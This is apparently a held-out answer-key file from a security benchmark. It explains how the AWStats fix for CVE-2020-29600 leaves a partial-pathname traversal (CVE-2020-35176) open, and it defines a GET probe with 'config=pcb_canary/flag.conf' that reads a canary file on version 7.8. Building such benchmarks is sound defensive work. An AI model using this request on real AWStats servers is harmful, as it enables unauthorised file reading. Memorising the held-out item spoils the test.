#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-35176 residual exploit — a PARTIAL absolute-pathname
bypass of the AWStats `config=` traversal guard.

The CVE-2020-29600 fix (patch.diff) only commented out Read_Config's
File::Spec->rel2abs absolute-path fallback, so a FULL absolute `config=` path no
longer opens. But it left "/etc" in @PossibleConfigDir, and the search loop opens
`$searchdir$SiteConfig` for each search dir. So a PARTIAL path that omits the
leading `/etc` — e.g. `pcb_canary/flag.conf` (no leading slash, no `..`, so the
`s/\\.\\.//g` guard is a no-op) — is opened as `/etc/pcb_canary/flag.conf` when
the loop reaches the `/etc` search dir. That is exactly what CVE-2020-35176
reports: "config= accepts a partial absolute pathname (omitting the initial
/etc) ... incomplete fix for CVE-2017-1000501 and CVE-2020-29600."

Contract: reaches the canary (flag) on V1 (AWStats 7.8) => the case is a
legitimate incomplete-patch positive. Closed on V2 (AWStats 7.9), which removes
"/etc" from @PossibleConfigDir so the partial path is never opened.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Partial path omitting the initial /etc: no leading slash, no `..`. The 7.8
# search loop prepends the "/etc" search dir -> opens /etc/pcb_canary/flag.conf.
PATH = "/cgi-bin/awstats.pl?config=pcb_canary/flag.conf"


def candidate() -> dict:
    return {"probe_id": "cve-2020-35176-partial-path-config", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
